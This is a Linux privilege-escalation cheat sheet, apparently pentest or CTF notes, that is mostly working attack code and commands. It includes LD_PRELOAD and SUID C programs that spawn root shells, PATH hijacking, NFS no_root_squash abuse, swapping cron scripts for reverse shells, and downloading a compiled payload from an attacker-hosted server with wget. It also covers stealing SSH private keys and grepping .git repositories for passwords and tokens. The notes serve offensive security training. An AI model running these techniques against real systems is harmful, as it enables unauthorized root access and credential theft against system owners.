# Privilege Escalation and Enumeration Techniques

## Enumeration
Before attempting any privilege escalation techniques, it is crucial to first enumerate the system. System enumeration provides essential context that guides the selection of appropriate escalation methods.

### Checking `su` Privileges
To determine if the current user has privileges to use the `su` command:
```bash
cat /etc/pam.d/su
```
This file governs PAM (Pluggable Authentication Modules) configurations for the `su` binary.

---

## Privilege Escalation Techniques

### Kernel Exploits
Identifying the system's kernel version can lead to privilege escalation if an associated vulnerability is found. These vulnerabilities can often be exploited using public CVEs.

- **Check kernel version:**
```bash
uname -r
```
- **Look for matching CVEs:** [Linux Kernels CVEs](https://www.linuxkernelcves.com/cves)

After identifying a suitable exploit:
1. Understand the exploit thoroughly.
2. Transfer the exploit to the target system (e.g., using Python's `SimpleHTTPServer` on the attacker machine and `wget` on the target).

---

### Sudo Exploitation
Use the following command to list sudo privileges:
```bash
sudo -l
```
Check the output for potentially exploitable binaries or scripts.

- Use [GTFO Bins](https://gtfobins.github.io/) to find ways to exploit commands listed by `sudo -l`.

#### Example Output:
```
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```
This indicates full root-level access without needing a password.

#### Leveraging Application Functions
Some applications (like Apache2) might support loading alternate configuration files. If the `sudo -l` output includes:
```
env_keep+=LD_PRELOAD
```
This allows dynamic loading of shared libraries into binaries.

- Example malicious shared object code (C):
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

- Compile and run:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

---

### SUID (Set-user Identification)
Files with the SUID or SGID bit set run with the privileges of the file owner.

- List SUID/SGID files:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
- Use [GTFO Bins](https://gtfobins.github.io/) with the "SUID" filter to look for exploitable binaries.

Use `ls -la` to analyze suspicious files further.

---

### Capabilities
Linux capabilities provide fine-grained control over root-like privileges.

- Check enabled capabilities:
```bash
getcap -r / 2>/dev/null
```
- Compare results with [GTFO Bins](https://gtfobins.github.io/) to identify escalation vectors.

---

### Cron Jobs
Cron jobs execute scripts at regular intervals with the privileges of the file owner.

- View crontab configuration:
```bash
cat /etc/crontab
```

If a script is editable and runs as root, replace its contents with a reverse shell or privilege-escalating payload and set up a listener to catch the shell.

---

### PATH Variable Hijacking
The `PATH` environment variable tells the system where to find executables.

- **Check PATH:**
```bash
echo $PATH
```
- **Check for writable directories:**
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

If a writable directory is in `PATH`, you can create a fake binary with the same name as a called command.

#### Example Exploit:
1. C code (`path_exp.c`):
```c
#include<unistd.h>
void main() {
  setuid(0);
  setgid(0);
  system("test");
}
```
2. Compile and set SUID:
```bash
gcc path_exp.c -o path -w
chmod u+s path
```
- *Note: If victim machine doesn't have compiler, go on attacking machine, create the file, compile on attacking machine*
	- *Compile the file with the `-static` flag at the end to contain all the libraries it needs to bypass any mismatch issues*
	- *Host python server and `wget` from victim machine (`python3 -m http.server 4545` - `wget http://10.10.14.14:4545/path`)*
3. Add writable dir to PATH and place `test`:
```bash
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/test
chmod 777 /tmp/test
./path
```

---

### NFS (Network File System)
If `no_root_squash` is set for an exported share, files created by root on the client are preserved as root on the server.

- Check `/etc/exports`:
```bash
cat /etc/exports
```
- Find exports (from attacking machine):
```bash
showmount -e <target-IP>
```
- Mount the export (from attacking machine):
```bash
mkdir /tmp/backupsonattackermachine
mount -o rw <target-IP>:/backups /tmp/backupsonattackermachine
```
- Create exploit file to set SUID bits:
```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```
- Compile into the */tmp/backupsonattackermachine* and set SUID:
```bash
gcc nfs.c -o nfs -w
chmod +s nfs
```
- Execute on target:
```bash
./nfs
```

---

### Readable Folders for SSH Access
Enumerate readable folders to find potential SSH private keys.

- Find readable folders:
```bash
find / -readable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
- Navigate to user folders with readable permissions:
```bash
cd /home
ls -la
```
- Check `.ssh` directory:
```bash
ls -la .ssh
cat id_rsa
```
- Copy the key and use it to log in:
```bash
chmod 600 key_file
ssh user@<IP_ADDRESS> -i key_file
```

---
### Search .git repositories
This method is valuable for uncovering exposed credentials and sensitive information that could lead to privilege escalation from .git repositories
#### 1. **Locate `.git` directories**
- **Command**:
```
find / -type d -name ".git" 2>/dev/null    
```
- **What to Look For**:  
    Search the system for any Git repositories. These often exist in web directories, user folders, or application directories.
#### 2. **Inspect `.git/config` for stored credentials**
- **Command**:
```
cat /path/to/.git/config
```
- **What to Look For**:  
    This file may contain remote URLs with embedded credentials, like `https://username:password@repo.git`, which could provide access to remote systems or services.
#### 3. **Check `.git/logs/HEAD` for user actions**
- **Command**:
```
cat /path/to/.git/logs/HEAD
```
- **What to Look For**:  
    The log shows commits and actions taken by users in the repository, which can reveal usernames, project paths, or internal system information.
#### 4. **Search for sensitive data in the repository’s history**
- **Command**:
```bash
git --git-dir=/path/to/.git log --all --grep="password"
```
- **What to Look For**:  
    Look through commit messages and diffs for sensitive information like passwords, keys, tokens, or configuration details.
#### 5. **Search for secrets in all files within the repository**
- **Command**:
```bash
git --git-dir=/path/to/.git grep -iE "password|key|token|secret"
```
- **What to Look For**:  
    This command searches all files in the repository for common secrets or sensitive data like hardcoded API keys or SSH private keys.
#### 6. **Extract files from `.git`**
- **Command**:
```bash
git --git-dir=/path/to/.git checkout .
```
- **What to Look For**:  
    This command restores deleted or hidden files that may contain secrets, configuration details, or exploitables (e.g., scripts with root access).
#### 7. **Examine `.git/refs/heads` for active branches**
- **Command**:
```
cat /path/to/.git/refs/heads/*
```
- **What to Look For**:  
    Check for active branches that may contain unmerged code, config changes, or other potential vulnerabilities.
---
#### **Summary of What You're Looking For**:
- **Credentials**: Hardcoded usernames, passwords, tokens, API keys.
- **User Activity**: Commit history, user actions (e.g., usernames, systems involved).
- **Sensitive Files**: Code, config files, scripts with sensitive info.
- **Secrets in History**: Hidden or deleted secrets that may be recovered.